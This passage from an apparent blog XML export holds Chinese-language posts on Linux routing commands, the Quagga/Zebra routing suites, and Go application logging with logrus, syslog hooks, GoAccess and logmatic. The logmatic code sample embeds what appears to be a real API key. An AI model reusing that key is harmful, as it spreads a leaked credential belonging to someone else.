<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://luodw.cc/2016/08/13/linux-cache/">linux内存分配与回收</a></li>
<li><a href="https://www.linuxatemyram.com/">Linux Ate my RAM</a></li>
<li><a href="https://www.vpsee.com/2013/10/how-to-configure-the-linux-oom-killer/">理解和配置 Linux 下的 OOM Killer |@vpsee</a></li>
<li><a href="http://github.com/zqhxuyuan/2017/10/25/Java-Threads/">图解JAVA多线程</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI4NTA1MDEwNg==&amp;mid=401218462&amp;idx=1&amp;sn=e2503ca6d561ef2c2111710cf76445c2&amp;scene=1&amp;srcid=1204m7T3VtJfzxOfTiCePNq5%23rd">LINUX类主机JAVA应用程序占用CPU、内存过高分析手段 | 2015-12-04 丁启良 DBAplus社群</a></li>
<li><a href="https://mp.weixin.qq.com/s/K8Y1wOloEwj1yQGEf7TnZQ">JVM源码分析之一个Java进程究竟能创建多少线程 | 原创 2016-12-06 寒泉子 你假笨</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title>How Linux Works:Router</title>
    <url>/2019/03/05/Linux-Works-Router/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>编辑中</li>
<li>路由协议</li>
<li>router based linux kernel</li>
</ul>
<a id="more"></a>
<h2 id="BASIC"><a href="#BASIC" class="headerlink" title="BASIC"></a>BASIC</h2><h4 id="BASIC-Commands"><a href="#BASIC-Commands" class="headerlink" title="BASIC Commands"></a>BASIC Commands</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">route -n</span><br><span class="line"><span class="comment"># To Host</span></span><br><span class="line">route add -host [ip] dev eth0</span><br><span class="line">route add -host [ip] gw [ip]</span><br><span class="line"><span class="comment"># To Network</span></span><br><span class="line">route add -net [ip] netmask [mask]</span><br><span class="line">route del -net [ip] netmask [mask] gw [......]</span><br><span class="line"><span class="comment"># default route</span></span><br><span class="line">route add default gw [......]</span><br></pre></td></tr></table></figure>
<h2 id="OpenSource-Routing-Projects"><a href="#OpenSource-Routing-Projects" class="headerlink" title="OpenSource Routing Projects"></a>OpenSource Routing Projects</h2><h4 id="What-is-Quagga"><a href="#What-is-Quagga" class="headerlink" title="What is Quagga?"></a>What is Quagga?</h4><p>Quagga is a routing software suite, providing implementations of OSPFv2, OSPFv3, RIP v1 and v2, RIPng and BGP-4 for Unix platforms, particularly FreeBSD, Linux, Solaris and NetBSD. Quagga is a fork of GNU Zebra which was developed by Kunihiro Ishiguro.</p>
<p>The Quagga architecture consists of a core daemon, zebra, which acts as an abstraction layer to the underlying Unix kernel and presents the Zserv API over a Unix or TCP stream to Quagga clients. It is these Zserv clients which typically implement a routing protocol and communicate routing updates to the zebra daemon. Existing Zserv implementations are:  </p>
<div class="table-container">
<table>
<thead>
<tr>
<th>IPv4</th>
<th>IPv6</th>
<th>desc</th>
</tr>
</thead>
<tbody>
<tr>
<td>zebra</td>
<td>zebra</td>
<td>kernel interface, static routes, zserv server</td>
</tr>
<tr>
<td>ripd</td>
<td>ripngd</td>
<td>RIPv1/RIPv2 for IPv4 and RIPng for IPv6</td>
</tr>
<tr>
<td>ospfd</td>
<td>ospf6d</td>
<td>OSPFv2 and OSPFv3</td>
</tr>
<tr>
<td>bgpd</td>
<td>bgpd</td>
<td>BGPv4+ (including address family support for multicast and IPv6)</td>
</tr>
<tr>
<td>isisd</td>
<td>isisd</td>
<td>IS-IS with support for IPv4 and IPv6</td>
</tr>
<tr>
<td>vtysh</td>
<td>vtysh</td>
<td>shell tools              </td>
</tr>
</tbody>
</table>
</div>
<h4 id="Zebra"><a href="#Zebra" class="headerlink" title="Zebra"></a>Zebra</h4><p>Zebra 是一个 TPC/IP 路由软件，支持 BGP、OSPF、RIP 和 RIPng。它遵循 GNU 通用公共许可协议，可以运行于 Linux 操作系统上（在 Red Hat 中已经附带了 Zebra 的 RPM 安装包）。</p>
<p>最初的 Zebra 软件包由 Kunihiro Ishiguro 和 Yoshinari Yoshikawa 于1996年完成。现在主要由 IP Infusion 及开源志愿者维持。</p>
<p>Zebra 采用模块的方法来管理协议。可以根据网络需要启用或者禁用协议。此外，Zebra 的配置同 Cisco IOS 极其类似，这一点对于已经熟悉 Cisco 的网络工程师来说非常方便。</p>
<p><a href="http://www.zebra.org/" target="_blank" rel="noopener">Zebra</a> is a multi-server routing software which provides TCP/IP based routing protocols. Zebra turns your machine into a full powered router. Some of the features of Zebra include:</p>
<ul>
<li>Common routing protocols such as RIP, OSPF, BGP supported.</li>
<li>IPv6 routing protocols such as RIPng and BGP-4+ supported.</li>
<li>User can dynamically change configuration from terminal interface.</li>
<li>User can use command line completion and history in terminal interface.</li>
<li>IP address based filtering, AS path based filtering, attribute modification by route map are supported.</li>
</ul>
<h4 id="Supported-Platforms"><a href="#Supported-Platforms" class="headerlink" title="Supported Platforms"></a>Supported Platforms</h4><p><strong>操作系统支持:</strong></p>
<ul>
<li>GNU/Linux</li>
<li>FreeBSD/NetBSD/OpenBSD</li>
</ul>
<p><strong>IPv6 支持:</strong></p>
<ul>
<li>NRL IPv6</li>
<li>KAME</li>
<li>INRIA IPv6</li>
</ul>
<h4 id="Quagga-ABC"><a href="#Quagga-ABC" class="headerlink" title="Quagga ABC"></a>Quagga ABC</h4><p><a href="https://www.quagga.net/" target="_blank" rel="noopener">Quagga</a> daemons are each configurable via a network accessible CLI (called a ‘vty’). The CLI follows a style similar to that of other routing software. There is an additional tool included with Quagga called ‘vtysh’, which acts as a single cohesive front-end to all the daemons, allowing one to administer nearly all aspects of the various Quagga daemons in one place.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># The default location</span></span><br><span class="line"></span><br><span class="line">/usr/<span class="built_in">local</span>/sbin/zebra</span><br><span class="line"></span><br><span class="line">/usr/<span class="built_in">local</span>/etc/zebra.conf</span><br></pre></td></tr></table></figure>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul>
<li><a href="http://download.savannah.gnu.org/releases/quagga/" target="_blank" rel="noopener">Quagga</a></li>
<li>The <a href="http://bird.network.cz/" target="_blank" rel="noopener">BIRD Internet Routing Daemon Project</a>, supported by cz.nic.</li>
<li>The <a href="http://www.openbgpd.org/" target="_blank" rel="noopener">OpenBGPd and OpenOSPFd project</a>, primarily developed for OpenBSD.</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf" target="_blank" rel="noopener">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details" target="_blank" rel="noopener">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt></p>
<h4 id="性能诊断指南"><a href="#性能诊断指南" class="headerlink" title="性能诊断指南"></a>性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="How-Linux-Works"><a href="#How-Linux-Works" class="headerlink" title="How Linux Works"></a>How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd" target="_blank" rel="noopener">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h4 id="案例与实务"><a href="#案例与实务" class="headerlink" title="案例与实务"></a>案例与实务</h4><ul>
<li><a href="https://riboseyim.github.io/2016/07/17/OpenSource-StackOverflow/" target="_blank" rel="noopener">最佳工程实践：Stack Overflow 架构 - 2016 Edition</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/Technology-Oracle/" target="_blank" rel="noopener">最佳工程实践：Oracle 数据库迁移割接实践</a></li>
<li><a href="https://riboseyim.github.io/2016/09/01/AAA/" target="_blank" rel="noopener">最佳工程实践：基于LVS的AAA负载均衡架构实践</a>  </li>
<li><a href="https://code.facebook.com/posts/1906146702752923/open-sourcing-katran-a-scalable-network-load-balancer/" target="_blank" rel="noopener">VIPServer | Facebook Open-sourcing Katran, a scalable network load balancer</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.ibm.com/developerworks/cn/linux/l-emu/index.html" target="_blank" rel="noopener">在 Linux 上构建网络路由器 | Dominique Cimafranca 和 Rex Young | 2004 年 3 月 09 日发布</a></li>
<li><a href="https://www.cnblogs.com/sanyuanempire/articles/6155254.html" target="_blank" rel="noopener">Linux下使用Quagga(Zebra)搭建路由器记录</a></li>
<li><a href="https://linuxhint.com/centos7_router/" target="_blank" rel="noopener">How to Make a CentOS 7 Router</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title>开源技术架构漫谈：应用程序的日志管理及可视化</title>
    <url>/2017/05/24/Log/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>程序中记录日志的首要目的：Troubleshooting。通过记录程序中对外部系统与模块的依赖调用、重要状态信息的变化、关键变量、关键逻辑等，显示基于时间轴的程序运行轨迹，显示业务是否正常、是否存在非预期执行，在出问题时方便还原现场，推断程序运行过程、理清问题的方向。</p>
<p>本文将讨论在实现日志功能过程中常见的一些问题，包括基础API、格式化、日志转发及可视化等方面，代码采用Go语言描述。</p>
<span id="more"></span>
<h3 id="一、Basic"><a href="#一、Basic" class="headerlink" title="一、Basic"></a>一、Basic</h3><p><strong>1、后台输出</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  fmt.Println(<span class="string">&quot;------hello world-----&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>2、There are no exceptions in Golang, only errors.</strong></p>
<p>Go语言不支持传统的 try…catch…finally 这种异常，因为Go语言的设计者们认为，将异常与控制结构混在一起会很容易使得代码变得混乱。因为开发者很容易滥用异常，甚至一个小小的错误都抛出一个异常，替代方案是使用多值返回来返回错误。当然Go并不是全面否定异常的存在，或者用recover+panic语法实现，只是极力不鼓励多用异常。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;errors&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="comment">/* local variable definition */</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* function for division which return an error if divide by 0 */</span></span><br><span class="line">   ret,err = div(a, b)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(ret)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>3、写入日志文件:</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;log&quot;</span></span><br><span class="line">  <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  f,err :=os.OpenFile(<span class="string">&quot;test.log&quot;</span>,os.O_WRONLY|os.O_CREATE|os.O_APPEND,<span class="number">0644</span>)</span><br><span class="line">  <span class="keyword">if</span> err !=<span class="literal">nil</span>&#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">defer</span> f.Close()</span><br><span class="line">  log.SetOutput(f)</span><br><span class="line">  log.Println(<span class="string">&quot;==========works==============&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">YRMacBook-Pro:go-log yanrui$ more test.log</span><br><span class="line">2017/05/24 21:46:25 ==========works==============</span><br></pre></td></tr></table></figure>
<h3 id="二、格式化"><a href="#二、格式化" class="headerlink" title="二、格式化"></a>二、格式化</h3><p>推荐日志工具库：logrus</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">go</span> get github.com/Sirupsen/logrus</span><br></pre></td></tr></table></figure>
<p><strong>1、JSON format</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  log <span class="string">&quot;github.com/Sirupsen/logrus&quot;</span></span><br><span class="line">  <span class="string">&quot;github.com/logmatic/logmatic-go&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// use JSONFormatter</span></span><br><span class="line">    log.SetFormatter(&amp;logmatic.JSONFormatter&#123;&#125;)</span><br><span class="line">    <span class="comment">// log an event as usual with logrus</span></span><br><span class="line">    log.WithFields(log.Fields&#123;<span class="string">&quot;string&quot;</span>: <span class="string">&quot;foo&quot;</span>, <span class="string">&quot;int&quot;</span>: <span class="number">1</span>, <span class="string">&quot;float&quot;</span>: <span class="number">1.1</span> &#125;).Info(<span class="string">&quot;My first ssl event from golang&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>日志输出样式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@marker&quot;</span>:[<span class="string">&quot;sourcecode&quot;</span>,<span class="string">&quot;golang&quot;</span>],</span><br><span class="line">  <span class="string">&quot;date&quot;</span>:<span class="string">&quot;2017-05-24T15:27:40+08:00&quot;</span>,</span><br><span class="line">  <span class="string">&quot;float&quot;</span>:<span class="number">1.1</span>,<span class="string">&quot;int&quot;</span>:<span class="number">1</span>,<span class="string">&quot;level&quot;</span>:<span class="string">&quot;info&quot;</span>,</span><br><span class="line">  <span class="string">&quot;message&quot;</span>:<span class="string">&quot;My first ssl event from golang&quot;</span>,</span><br><span class="line">  <span class="string">&quot;string&quot;</span>:<span class="string">&quot;foo&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="三、附加上下文"><a href="#三、附加上下文" class="headerlink" title="三、附加上下文"></a>三、附加上下文</h3><p>通过logrus库可以加入一些上下文信息，例如：主机名称，程序名称或者会话参数等。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">contextLogger := log.WithFields(log.Fields&#123;</span><br><span class="line">  <span class="string">&quot;common&quot;</span>: <span class="string">&quot;XXX common content XXX&quot;</span>,</span><br><span class="line">  <span class="string">&quot;other&quot;</span>: <span class="string">&quot;YYY special context YYY&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">contextLogger.Info(<span class="string">&quot;AAAAAAAAAAAA&quot;</span>)</span><br><span class="line">contextLogger.Info(<span class="string">&quot;BBBBBBBBBBBB&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>日志输出样式：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">YRMacBook-Pro:go-log yanrui$ go run LogMatic.go</span><br><span class="line">&#123;<span class="string">&quot;@marker&quot;</span>:[<span class="string">&quot;sourcecode&quot;</span>,<span class="string">&quot;golang&quot;</span>],<span class="string">&quot;common&quot;</span>:<span class="string">&quot;XXX common content XXX&quot;</span>,<span class="string">&quot;date&quot;</span>:<span class="string">&quot;2017-05-24T17:00:08+08:00&quot;</span>,<span class="string">&quot;level&quot;</span>:<span class="string">&quot;info&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;AAAAAAAAAAAA&quot;</span>,<span class="string">&quot;other&quot;</span>:<span class="string">&quot;YYY special context YYY&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@marker&quot;</span>:[<span class="string">&quot;sourcecode&quot;</span>,<span class="string">&quot;golang&quot;</span>],<span class="string">&quot;common&quot;</span>:<span class="string">&quot;XXX common content XXX&quot;</span>,<span class="string">&quot;date&quot;</span>:<span class="string">&quot;2017-05-24T17:00:08+08:00&quot;</span>,<span class="string">&quot;level&quot;</span>:<span class="string">&quot;info&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;BBBBBBBBBBBB&quot;</span>,<span class="string">&quot;other&quot;</span>:<span class="string">&quot;YYY special context YYY&quot;</span>&#125;</span><br><span class="line">YRMacBook-Pro:go-log yanrui$</span><br></pre></td></tr></table></figure></p>
<h3 id="四、Hooks"><a href="#四、Hooks" class="headerlink" title="四、Hooks"></a>四、Hooks</h3><p>我们还可以利用Hook机制实现日志功能扩展，例如Syslog hook，将输出的日志发送到指定的Syslog服务。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line">  <span class="string">&quot;gopkg.in/gemnasium/logrus-airbrake-hook.v2&quot;</span> <span class="comment">// the package is named &quot;aibrake&quot;</span></span><br><span class="line">  logrus_syslog <span class="string">&quot;github.com/sirupsen/logrus/hooks/syslog&quot;</span></span><br><span class="line">  <span class="string">&quot;log/syslog&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    hook, err := logrus_syslog.NewSyslogHook(<span class="string">&quot;udp&quot;</span>, <span class="string">&quot;59.37.0.1:514&quot;</span>, syslog.LOG_INFO, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Error(<span class="string">&quot;Unable to connect to local syslog daemon&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      log.AddHook(hook)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>验证是否发送Syslog：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ sudo tcpdump | grep <span class="number">59.37</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">tcpdump: data link <span class="keyword">type</span> PKTAP</span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on pktap, link-<span class="keyword">type</span> PKTAP (Apple DLT_PKTAP), capture size <span class="number">262144</span> bytes</span><br><span class="line"><span class="number">18</span>:<span class="number">51</span>:<span class="number">05.663612</span> IP <span class="number">192.168</span><span class="number">.199</span><span class="number">.15</span><span class="number">.58819</span> &gt; <span class="number">59.37</span><span class="number">.0</span><span class="number">.1</span>.syslog: SYSLOG kernel.info, length: <span class="number">314</span></span><br><span class="line"><span class="number">18</span>:<span class="number">51</span>:<span class="number">05.663657</span> IP <span class="number">192.168</span><span class="number">.199</span><span class="number">.15</span><span class="number">.58819</span> &gt; <span class="number">59.37</span><span class="number">.0</span><span class="number">.1</span>.syslog: SYSLOG kernel.info, length: <span class="number">314</span></span><br></pre></td></tr></table></figure>
<h3 id="五、可视化"><a href="#五、可视化" class="headerlink" title="五、可视化"></a>五、可视化</h3><p>在真实场景中日志数据体量非常庞大，日志存储只是第一步，更多的情况是需要查看特定指标或者能够快速检索信息，此时日志分析平台就发挥作用了。</p>
<ul>
<li><a href="https://goaccess.io">GoAccess</a>: Web Server Log</li>
</ul>
<p><img src="https://goaccess.io/images/goaccess-dashboard.png" alt=""></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ wget https://tar.goaccess.io/goaccess-1.3.tar.gz</span><br><span class="line">$ tar -xzvf goaccess-1.3.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> goaccess-1.3/</span><br><span class="line">$ ./configure --enable-utf8 --enable-geoip=legacy</span><br><span class="line">$ make</span><br><span class="line"><span class="comment"># make install</span></span><br></pre></td></tr></table></figure>
<ul>
<li><a href="https://logmatic.io">logmatic</a></li>
</ul>
<p>在使用logmatic之前，需要下载它的hook支持：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">go</span> get github.com/logmatic/logmatic-<span class="keyword">go</span></span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// instantiate a new Logger with your Logmatic APIKey</span></span><br><span class="line">    <span class="comment">// 国内访问比较慢</span></span><br><span class="line">  	log.AddHook(logmatic.NewLogmaticHook(<span class="string">&quot;p53uTkOhSEqI3-116DynkQ&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ..........</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果如下：<br><img src="http://riboseyim-qiniu.riboseyim.com/logmatic_demo_1.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/logmatic_demo_2.png" alt=""></p>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="Tail-Multiple-Files"><a href="#Tail-Multiple-Files" class="headerlink" title="Tail Multiple Files"></a>Tail Multiple Files</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Native Tail Command</span></span><br><span class="line">$ tail -f file1 file2</span><br><span class="line"><span class="comment"># multitail Utility</span></span><br><span class="line"><span class="comment"># yum install multitail</span></span><br><span class="line">$ multitail access.log httpd.log</span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读：开发语言-amp-代码工程"><a href="#扩展阅读：开发语言-amp-代码工程" class="headerlink" title="扩展阅读：开发语言&amp;代码工程"></a>扩展阅读：开发语言&amp;代码工程</h2><ul>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">Stack Overflow：2017年最赚钱的编程语言</a></li>
<li><a href="https://riboseyim.github.io/2017/12/21/Language-Auto-Generator/">玩转编程语言:构建自定义代码生成器</a></li>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">远程通信协议:从 CORBA 到 gRPC</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2016/08/15/OpenSource-Kafka/">LinkedIn 开源 Kafka Monitor</a></li>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于Go语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/05/24/Log/">应用程序开发中的日志管理(Go语言描述)</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://blog.codingnow.com/2018/05/ineffective_debugger.html">云风的BLOG：断点单步跟踪是一种低效的调试方法</a></li>
<li><a href="https://logmatic.io/blog/our-guide-to-a-golang-logs-world/?utm_content=buffer1f62f&amp;utm_medium=social&amp;utm_source=twitter.com&amp;utm_campaign=buffer">logmatic.io:Our Guide to a Golang logs world</a></li>
<li><a href="https://logmatic.io/blog/beyond-application-monitoring-discover-logging-best-practices/">logmatic.io:Beyond Application Monitoring</a></li>
<li><a href="https://tools.ietf.org/html/rfc5424">Syslog RFC 5424</a></li>
<li><a href="https://blog.golang.org/error-handling-and-go">Golang Blog:Error handling and Go</a></li>
<li><a href="https://dave.cheney.net/2012/01/18/why-go-gets-exceptions-right">Dave Cheney:Why Go gets exceptions right</a></li>
<li><a href="http://www.cnblogs.com/ghj1976/archive/2013/02/11/2910114.html">蝈蝈俊:Go的异常处理 defer, panic, recover</a></li>
<li><a href="https://www.zhihu.com/question/27158146">知乎：Go 语言的错误处理机制是一个优秀的设计吗？</a></li>
<li><a href="https://leo108.com/pid-2256.asp">Monolog优化及打造ELK友好的日志格式 | Leo108’s Blog</a></li>
<li><a href="https://www.tecmint.com/watch-or-monitor-linux-log-files-in-real-time/">4 Ways to Watch or Monitor Log Files in Real Time</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMDU1MTE1OQ==&amp;mid=403051208&amp;idx=1&amp;sn=1694ac05acbcb5ca53c88bfac8a68856&amp;scene=1&amp;srcid=1224xZuQ9QQ4sRmiPVdHTppL%23rd">【年度案例】Twitter高性能分布式日志系统架构解析 | 原创 2015-12-24 郭斯杰 高可用架构</a></li>
<li><a href="https://www.ipswitch.com/Ipswitch/media/Ipswitch/Documents/Resources/Whitepapers%20and%20eBooks/ELM_Security_WP.pdf?ext=.pdf">BEST PRACTICES:EVENT LOG MANAGEMENT FOR SECURITY AND COMPLIANCE INITIATIVES| By Ipswitch, Inc. Network Managment Division</a></li>
<li><a href="https://www.rsyslog.com/doc/v8-stable/configuration/index.html">rsyslog 8.1901.0 documentation</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>How Linux Works</title>
    <url>/2019/04/21/Linux-Works/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>第一部分 The Big Picture</li>
